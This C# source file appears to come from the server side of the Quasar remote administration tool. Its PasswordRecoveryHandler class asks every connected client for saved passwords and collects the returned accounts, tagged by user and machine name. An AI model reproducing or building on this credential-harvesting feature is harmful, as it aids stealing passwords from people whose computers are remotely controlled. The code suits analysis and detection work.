using System.Collections.Generic;
using System.Linq;
using Quasar.Common.Messages;
using Quasar.Common.Models;
using Quasar.Common.Networking;
using Quasar.Server.Networking;

namespace Quasar.Server.Messages
{
    public class PasswordRecoveryHandler : MessageProcessorBase<object>
    {
        /// <summary>
        /// The clients which is associated with this password recovery handler.
        /// </summary>
        private readonly Client[] _clients;

        /// <summary>
        /// Represents the method that will handle recovered accounts.
        /// </summary>
        /// <param name="sender">The message processor which raised the event.</param>
        /// <param name="clientIdentifier">A unique client identifier.</param>
        /// <param name="accounts">The recovered accounts</param>
        public delegate void AccountsRecoveredEventHandler(object sender, string clientIdentifier, List<RecoveredAccount> accounts);

        /// <summary>
        /// Raised when accounts got recovered.
        /// </summary>
        /// <remarks>
        /// Handlers registered with this event will be invoked on the 
        /// <see cref="System.Threading.SynchronizationContext"/> chosen when the instance was constructed.
        /// </remarks>
        public event AccountsRecoveredEventHandler AccountsRecovered;

        /// <summary>
        /// Reports recovered accounts from a client.
        /// </summary>
        /// <param name="accounts">The recovered accounts.</param>
        /// <param name="clientIdentifier">A unique client identifier.</param>
        private void OnAccountsRecovered(List<RecoveredAccount> accounts, string clientIdentifier)
        {
            SynchronizationContext.Post(d =>
            {
                var handler = AccountsRecovered;
                handler?.Invoke(this, clientIdentifier, (List<RecoveredAccount>)d);
            }, accounts);
        }

        /// <summary>
        /// Initializes a new instance of the <see cref="PasswordRecoveryHandler"/> class using the given clients.
        /// </summary>
        /// <param name="clients">The associated clients.</param>
        public PasswordRecoveryHandler(Client[] clients) : base(true)
        {
            _clients = clients;
        }

        /// <inheritdoc />
        public override bool CanExecute(IMessage message) => message is GetPasswordsResponse;

        /// <inheritdoc />
        public override bool CanExecuteFrom(ISender sender) => _clients.Any(c => c.Equals(sender));

        /// <inheritdoc />
        public override void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case GetPasswordsResponse pass:
                    Execute(sender, pass);
                    break;
            }
        }

        /// <summary>
        /// Starts the account recovery with the associated clients.
        /// </summary>
        public void BeginAccountRecovery()
        {
            var req = new GetPasswords();
            foreach (var client in _clients.Where(client => client != null))
                client.Send(req);
        }

        private void Execute(ISender client, GetPasswordsResponse message)
        {
            Client c = (Client) client;

            string userAtPc = $"{c.Value.Username}@{c.Value.PcName}";

            OnAccountsRecovered(message.RecoveredAccounts, userAtPc);
        }

        protected override void Dispose(bool disposing)
        {
        }
    }
}
